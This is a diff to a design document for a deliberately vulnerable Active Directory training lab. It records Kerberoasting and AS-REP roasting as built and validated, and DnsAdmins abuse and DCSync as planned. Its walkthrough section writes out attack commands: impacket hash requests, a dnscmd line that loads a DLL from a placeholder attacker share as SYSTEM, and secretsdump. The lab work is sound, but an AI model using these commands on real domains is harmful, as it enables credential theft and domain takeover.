@@ -6,7 +6,7 @@ Phase 1 is complete on the Windows Server 2019 domain controller `uow-csf-dc` at
 
 Everything in this document was executed manually by the project owner and verified from real command output. Nothing was run by an assistant, and no verification claim here is inferred rather than observed.
 
-Phase 2, the deliberate vulnerability layer, is still design-only. Section 10 in particular describes techniques written against accounts and misconfigurations that do not exist yet, and none of it has been validated.
+Phase 2, the deliberate vulnerability layer, is partially built. Kerberoasting (`svc-web`) and AS-REP roasting (`helpdesk01`) have been built and validated on the master DC, see `e-18`/`e-19`. The `DnsAdmins`-abuse and DCSync techniques in Section 10 remain design-only, written against accounts and rights that do not exist yet, and are not validated.
 
 This revises the earlier `claude_w-01-windows-ad-baseline-design.md`. That document is background only and is not authoritative where it conflicts with the decisions below, in particular its Server Core and WordPress conclusions, which are not current.
 
@@ -16,7 +16,7 @@ This revises the earlier `claude_w-01-windows-ad-baseline-design.md`. That docum
 - Snapshot at that point: `cav-csf-windows-01-clean-server2019-vmtools` (Windows Server 2019 + VMware Tools only).
 - Static IP, hostname rename, AD DS/DNS roles and domain promotion: all done and validated, see the next section.
 - OU, user and group scaffolding: built, matching section 3 exactly.
-- Deliberate vulnerabilities and the website component: not started, Phase 2 and section 5 respectively.
+- Deliberate vulnerabilities: partially built. Kerberoasting on `svc-web` and AS-REP roasting on `helpdesk01` are built and validated, see `e-18`/`e-19`; `DnsAdmins` abuse and DCSync are not started. Website component: not started (section 5).
 - Master reproduction at `192.168.144.200` is complete; sections 7 to 9 are retained as the completed build sequence and validation record.
 
 ## Phase 1 AD DS/DNS baseline: passed
@@ -174,7 +174,7 @@ Until any of the above is deliberately added to a specific account or group, its
   - `Web-Services`, members: `svc-web`
   - `Backup-Operators-Lab`, members: `backup.operator`
   - `Staff-Admin`, unpopulated placeholder
-- No SPNs, no `DoesNotRequirePreAuth`, no description-field content, no ACL changes, and no group nesting beyond flat membership have been applied to any of the above. Naming (`IT-Helpdesk`, `Web-Services`, `Backup-Operators-Lab`) anticipates which accounts/groups Phase 2 will likely attach weaknesses to, but the weaknesses themselves are not yet present.
+- An SPN has been applied to `svc-web` (`e-18`) and `DoesNotRequirePreAuth` to `helpdesk01` (`e-19`). No description-field content, ACL changes, or group nesting beyond flat membership have been applied to any account. Naming (`IT-Helpdesk`, `Web-Services`, `Backup-Operators-Lab`) anticipated which accounts/groups Phase 2 would attach weaknesses to, and the two built weaknesses above confirm that naming; the remaining candidate weaknesses are not yet present.
 
 ### Password provisioning (confirmed plan)
 
@@ -283,32 +283,32 @@ nmap -p 53,88,135,139,389,445,464,636,3268,3269 -sV 192.168.144.200
 - `Get-Counter '\Memory\Available MBytes'`: a quick practical reading at both Checkpoint A and Checkpoint B (section 7, build steps), not a sampled benchmark. This is the key Desktop Experience vs Server Core decision input, compare against the threshold in section 12.
 - `nmap` from Kali: expect open ports on 53 (domain), 88 (kerberos-sec), 135 (msrpc), 139/445 (SMB), 389/636 (ldap/ldaps), 464 (kpasswd), 3268/3269 (Global Catalog). Version detection should identify Microsoft DNS and a Windows RPC/SMB stack consistent with Server 2019. Anything missing from this set indicates a role or firewall issue to resolve before moving to Phase 2.
 
-## 10. Reproducible exploit/walkthrough instructions for later phases (not yet configured, not validated)
+## 10. Reproducible exploit/walkthrough instructions for later phases
 
-These are design proposals for Phase 2 techniques, written against accounts and misconfigurations that do not exist yet. None of this can be run until the corresponding Phase 2 scenario is actually built, and each must be validated empirically against the real lab, consistent with the existing Linux VM methodology of testing every intended vulnerability rather than assuming it works.
+This section records both completed and still-planned Phase 2 techniques. Kerberoasting and AS-REP roasting have now been built and validated against the master DC, see `e-18` and `e-19`. The remaining techniques in this section, including `DnsAdmins` abuse and DCSync, are design proposals only and cannot be run until the corresponding Phase 2 scenario is actually built. Each intended vulnerability must continue to be validated empirically against the real lab before it is documented as complete.
 
-**Kerberoasting** (requires a Phase 2 service account with a registered SPN and a crackable password), from a domain-authenticated Kali/Linux foothold:
+**Kerberoasting** — built and validated against `svc-web` (registered SPN, crackable password), see `e-18`. The commands below are retained as the general technique reference:
 
 ```bash
 impacket-GetUserSPNs uow-csf.internal/<domain-user> -dc-ip 192.168.144.200 -request
 ```
 Expect one or more `$krb5tgs$` hashes for accounts carrying an SPN, then offline cracking with `hashcat -m 13100`.
 
-**AS-REP Roasting** (requires a Phase 2 account with Kerberos pre-authentication deliberately disabled), unauthenticated against the DC:
+**AS-REP Roasting** — built and validated against `helpdesk01` (`DoesNotRequirePreAuth` set), see `e-19`. The commands below are retained as the general technique reference:
 
 ```bash
 impacket-GetNPUsers uow-csf.internal/ -usersfile <userlist> -dc-ip 192.168.144.200 -no-pass
 ```
 Expect a `$krb5asrep$` hash for any account with pre-auth disabled, cracked with `hashcat -m 18200`.
 
-**DnsAdmins abuse** (requires a Phase 2 account placed in the `DnsAdmins` group), from that account:
+**DnsAdmins abuse** — not yet built or validated; requires a Phase 2 account placed in the `DnsAdmins` group, from that account:
 
 ```cmd
 dnscmd uow-csf-dc /config /serverlevelplugindll \\<attacker-share>\<malicious.dll>
 ```
 followed by restarting the DNS service to load the DLL as SYSTEM. This has real blast-radius risk on a shared lab network (arbitrary code as SYSTEM on the DC), so it needs explicit scoping before being added to Phase 2, see section 12.
 
-**DCSync** (requires a Phase 2 account granted replication rights it should not hold), from that account:
+**DCSync** — not yet built or validated; requires a Phase 2 account granted replication rights it should not hold, from that account:
 
 ```bash
 impacket-secretsdump uow-csf.internal/<account>:<password>@192.168.144.200
@@ -323,8 +323,6 @@ Each of these needs its own numbered write-up, following the existing `.md` docu
 - Any heavy Windows server role (SQL Server, Exchange-like services)
 - Weak/default or reused passwords
 - Passwords or clues in user description fields
-- Kerberoastable SPNs on service accounts
-- AS-REP roastable accounts (requires deliberately disabling pre-auth)
 - Over-privileged users/groups and misconfigured ACLs
 - `DnsAdmins` abuse path
 - DCSync rights misconfiguration
